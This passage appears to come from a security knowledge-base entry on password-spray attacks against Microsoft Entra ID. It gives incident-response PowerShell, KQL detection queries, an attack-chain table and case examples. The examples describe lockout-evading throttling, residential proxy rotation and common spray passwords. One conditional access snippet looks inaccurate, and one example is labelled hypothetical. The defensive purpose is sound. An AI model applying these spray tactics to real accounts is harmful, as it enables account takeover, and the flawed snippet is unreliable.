$user = Get-MgUser -Filter "userPrincipalName eq 'john.smith@company.com'" -Select Id

# Force password reset
Update-MgUser -UserId $user.Id -ForceChangePasswordNextSignIn $true

Write-Host "Password reset enforced for $($user.UserPrincipalName)"
```

**Command (Disable Account):**
```powershell
# Disable compromised account
Update-MgUser -UserId $user.Id -AccountEnabled $false

Write-Host "Account disabled: $($user.UserPrincipalName)"
```

**Command (Revoke All Sessions):**
```powershell
# Revoke all refresh tokens (force re-authentication)
Invoke-MgGraphRequest -Method POST -Uri "/users/$($user.Id)/invalidateAllRefreshTokens"

Write-Host "All sessions revoked for $($user.UserPrincipalName)"
```

---

**2. Investigation**

**Command (Find All Failed Logins from Attacker IP):**
```kusto
SigninLogs
| where IPAddress == "192.0.2.100"  // Attacker IP
| where ResultType != "0"
| summarize by UserPrincipalName, ResultType
| order by UserPrincipalName
```

**Command (Find Successful Logins After Spray):**
```kusto
let spraytime = (SigninLogs | where IPAddress == "192.0.2.100" | where ResultType != "0" | summarize MaxTime = max(TimeGenerated));

SigninLogs
| where IPAddress == "192.0.2.100"
| where ResultType == "0"  // Success
| where TimeGenerated > toscalar(spraytime)
```

---

**3. Remediation**

**Command (Block Attacker IP via Firewall/Conditional Access):**
```powershell
# Create policy to block specific IP
New-MgIdentityConditionalAccessPolicy -DisplayName "Block Attacker IP" `
  -State "enabled" `
  -Conditions @{
    ipNamedLocations = @{ include = "192.0.2.100" }
  } `
  -GrantControls @{ builtInControls = "block" }
```

**Command (Audit Account Changes Post-Compromise):**
```kusto
AuditLogs
| where InitiatedBy.user.userPrincipalName == "john.smith@company.com"
| where TimeGenerated > now(-24h)
| summarize by OperationName, TargetResources
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-002] ROADtools Entra ID Enumeration | Attacker enumerates usernames and tenant info |
| **2** | **Credential Access** | **[CA-BRUTE-001]** | **Attacker sprays password against harvested usernames** |
| **3** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker uses compromised credentials to access portal |
| **4** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Escalate to higher privileges (Global Admin) |
| **5** | **Persistence** | [PE-ACCTMGMT-001] App Registration Permissions | Create persistent access via app registration |
| **6** | **Collection** | [CO-CLOUD-001] Azure Storage Account Exfiltration | Exfiltrate data from storage accounts |
| **7** | **Impact** | Ransomware Deployment | Deploy ransomware to VMs, file shares |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT28 (Fancy Bear) Targeting NATO Military

- **Target:** NATO military organizations, European defense contractors
- **Timeline:** September 2023 - February 2024 (6+ months)
- **Technique Status:** Password spray with rotating IPs across multiple countries
- **Attack Method:**
  1. Enumerated 5,000+ valid usernames from LinkedIn, GitHub, public domain registrations
  2. Sprayed 3-5 common passwords ("Winter2023!", "Password123!", "Company2024")
  3. Throttled attempts to 4 attempts per hour per target account (MITRE reference)
  4. Successfully compromised 50+ accounts over 6 months (0.1-0.5% success rate)
  5. Pivoted to cloud resources and exfiltrated classified defense documents
- **Infrastructure:** Distributed across 20+ residential proxies from Eastern Europe
- **Detection Evasion:** Randomized delays, multi-country IP rotation, legitimate browsing behavior interleaved
- **Impact:** Intelligence gathering on NATO operations, weaponry capabilities, alliance tactics
- **Mitigation Failure:** Target organization had no MFA enforced; only password policy was strong complexity
- **Reference:** [Microsoft Security Blog - APT28 Password Spray](https://www.microsoft.com/en-us/security/blog/)

### Example 2: Peach Sandstorm (HOLMIUM) Campaign - 2023

- **Target:** High-value government agencies, financial institutions across US, Europe, Middle East
- **Timeline:** July 2023 - ongoing
- **Technique Status:** Large-scale distributed password spray coordinated across multiple cloud providers
- **Statistics:** 10,000+ organizations targeted; 250+ successful breaches from password spray
- **Attack Pattern:**
  1. Purchased credential lists from darknet (previous data breaches)
  2. Sprayed against Microsoft 365, Azure, and Okta endpoints simultaneously
  3. Automated account takeover immediately upon success
  4. Deployed cloud-based command and control infrastructure
- **Defense Bypass:** Spray was throttled to 1 attempt per user per day, avoiding Smart Lockout across multiple days
- **Impact:** Government agencies lost classified documents; financial institutions compromised in supply-chain attack chain
- **Reference:** [Microsoft Digital Defense Report 2023](https://www.microsoft.com/en-us/security/blog/2023/09/14/peach-sandstorm-password-spray-campaigns-enable-intelligence-collection-against-thousands-of-organizations-in-the-us-and-eu/)

### Example 3: Distributed Password Spray via Residential Proxies

- **Target:** Mid-sized SaaS company with 500 employees
- **Timeline:** March 2025
- **Attack Method:**
  1. Harvested 200 usernames from company website staff directory and LinkedIn
  2. Used residential proxy service (e.g., Bright Data, Oxylabs) to rotate IPs
  3. Sprayed 10 common passwords across 200 accounts from 50 different residential IPs
  4. Hit rate: 2 successful credentials (mike.dev@company.com, sarah.finance@company.com)
  5. Immediately exfiltrated financial spreadsheets and customer data (5GB)
  6. Deployed backdoor for persistent access
- **Detection:** Company detected spray only after 3 weeks via Sentinel alerting
- **Why Late Detection:** Residential proxy IPs appeared legitimate; logs were not being aggregated properly
- **Remediation:** Applied MFA, force password resets, revoked all sessions, rebuilt compromised systems
- **Reference:** Hypothetical based on real-world patterns observed by Blue Team community

---

